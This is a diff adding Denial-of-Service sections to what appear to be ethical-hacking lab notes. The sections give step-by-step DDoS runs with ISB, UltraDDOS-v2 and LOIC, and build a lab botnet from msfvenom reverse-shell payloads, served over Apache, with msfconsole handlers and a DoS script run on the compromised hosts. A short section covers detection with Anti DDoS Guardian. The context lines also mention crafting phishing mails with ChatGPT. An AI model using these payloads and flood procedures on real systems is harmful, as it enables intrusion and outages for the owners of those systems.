@@ -1571,3 +1571,132 @@ It’s basically a wrapper around the OpenAI API.
   - Apart from the aforementioned prompts, you can further use other prompts to craft a phishing mail and send to the victims in order to perform social engineering attacks
   - This concludes the demonstration of crafting phishing mails using ChatGPT              
 </details>
+
+# Denial-of-Service
+<details>
+<summary>Perform DoS and DDoS Attacks using Various Techniques</summary>
+
+* Perform a DDoS Attack using ISB and UltraDDOS-v2 :~
+  - tools: 
+    - ISB(i am so bored)
+    - UltraDDOS-v2
+  - open window 11 and download ISB(im so bored)
+  - sing this tool we can perform various attacks such as HTTP Flood, UDP Flood, TCP Flood, TCP Port Scan, ICMP Flood, and Slowloris
+  - we will perform TCP Flood attack on the target Windows Server 2019 machine
+  - open the ISB tools :
+    - URL = <target_ip>
+    - port = <default 80 (our choice)>
+    - click = set target
+  - under attack go to the TCP flood:
+    - interval = 10
+    - buffer = 256
+    - threads = 1000
+  - Leave the ISB window running and click and open the windows server 2022
+  - download the ultraddos.exe
+  - In the Ultra DDOS v2 window, click on DDOS Attack button
+  - Please enter your target. This is the website or IP address that you want to attack = <target_ip>
+  - Please enter a port. 80 is most commonly used, but you can use any other valid port = 80 
+  - Please enter the number of packets you would like to send. More is better, but too many will crash your computer = 1000000
+  - Please enter the number of threads you would like to send. This can be the same number as the packets = 1000000
+  - The attack will start once you press OK. It will keep going until all requested packets are sent
+  - As soon as you click on OK the tool starts DoS attack on the Windows Server 2019
+  - witch to the Windows 11 machine, and in the ISB window click on Start Attack button
+  - switch to the Windows Server 2019 machine
+  -  search for resmon in the search bar and CPU utilization under CPU section is more than 80%
+
+* Perform a DDoS Attack using Botnet :~
+  - switch to the Parrot Security machine. Open a Terminal window and execute sudo su to run the programs as a root user
+  - Run the command for creating payload for system 1(windws 11):
+    ```console
+         msfvenom -p windows/meterpreter/reverse_tcp lhost=10.10.1.13 lport=6969 -f exe > exploit1.exe
+    ```
+  - Run the command for creating payload for system 2(windows server 2019):
+    ```console
+          msfvenom -p windows/meterpreter/reverse_tcp lhost=10.10.1.13 lport=9999 -f exe > exploit2.exe 
+    ```    
+  - Run the command for creating payload for system 3(windows server 2022):
+    ```console
+          msfvenom -p windows/meterpreter/reverse_tcp lhost=10.10.1.13 lport=5555 -f exe > exploit3.exe 
+    ``` 
+  - Create a new directory to share the exploits file: 
+    ```console
+         mkdir /var/www/html/share
+    ```
+  - provide the permissions:
+    ```console
+         chmod -R 755 /var/www/html/share/
+    ```
+    ```console
+         chown -R www-data:www-data /var/www/html/share/
+    ```
+  - Copy the payloads into the shared folder:
+    ```console
+         cp exploit1.exe exploit2.exe exploit3.exe /var/www/html/share/
+    ```
+  - Start the Apache server = service apache2 start
+  - Launch three new terminals and run command sudo su
+  - launch metasploit framework for create the handler or listener for those three payloads:
+    - for system 1(windows 11):
+      ```console
+           msfconsole -x "use exploit/multi/handler; set payload windows/meterpreter/reverse_tcp; set lhost 10.10.1.13; set lport 6969; run"
+      ```
+    - for system 2(windows server 2019):
+      ```console
+           msfconsole -x "use exploit/multi/handler; set payload windows/meterpreter/reverse_tcp; set lhost 10.10.1.13; set lport 9999; run" 
+      ```
+    - for system 3(windows server 2022):
+      ```console
+           msfconsole -x "use exploit/multi/handler; set payload windows/meterpreter/reverse_tcp; set lhost 10.10.1.13; set lport 5555; run"  
+      ```
+  - switch to the Windows 11 machine and go to = http://10.10.1.13/share  
+  - download the exploit1.exe for this system and execute that file
+  - do the same thing with system 2 and system 3 also
+  - go back to the host mechine parrot and the meterpreter session has successfully been opened
+  - Now, we will upload the DDoS script to our botnets
+  - in windows shell terminal:
+    ```console
+         upload /home/attacker/Downloads/eagle-dos.py
+    ```
+  - run shell
+    - run the DDoS file using command python eagle-dos.py 
+    - target ip address(for ex 10.10.1.9)  
+  - Make sure you run script on all 3 shell terminals
+  - open target system and opne terminal with sudo wireshark
+  - Wait for 5-6 minutes, then click on Show Applications and search for and launch System Monitor
+  - in memory usage is 98.7% and which slows down Ubuntu machine and also makes it unresponsive                                                                      
+</details>
+
+<details>
+<summary>Detect and Protect Against DoS and DDoS Attacks</summary>
+
+* Detect and Protect Against DDoS Attacks using Anti DDoS Guardian :~
+  - open windows 11 and download Anti_DDoS_Guardian_setup.exe
+  - Setup - Anti DDoS Guardian window appears; click Next
+  - uncheck the install Stop RDP Brute Force option and click next
+  - install the that tool
+  - Completing the Anti DDoS Guardian Setup Wizard window appears; ensure that Launch Anti DDoS Guardian option is selected and click Finish
+  - switch to the Windows Server 2019 and download Low Orbit Ion Cannon (LOIC)
+  - inside the LOIC:
+    - Select your target IP = <target_IP>
+    - click = Lock on 
+  - Under the Attack options:
+    - method = UDP
+    - Threads = 5
+    - Slide the power bar to the middle
+  - switch to the Windows Server 2022 machine and follow the smae step of LOIC
+  - click the IMMA CHARGIN MAH LAZER button under the Ready? section to initiate the DDoS attack on the target
+  - witch back to the Windows 11 machine and observe the packets captured by Anti DDoS Guardian
+  - Observe the huge number of packets coming from the host machines (10.10.1.19 [Windows Server 2019] and 10.10.1.22 [Windows Server 2022]
+  - Double-click any of the sessions 10.10.1.19 or 10.10.1.22
+  - Anti DDoS Guardian Traffic Detail Viewer window appears, displaying the content of the selected session in the form of raw data 
+  - you can observe the high number of incoming bytes from Remote IP address 10.10.1.22
+  - You can use various options from the left-hand pane such as Clear, Stop Listing, Block IP, and Allow IP
+  - Observe that the blocked IP session turns red in the Action Taken column  
+</details>
+
+# Session Hijacking
+<details>
+<summary></summary>
+
+
+</details>
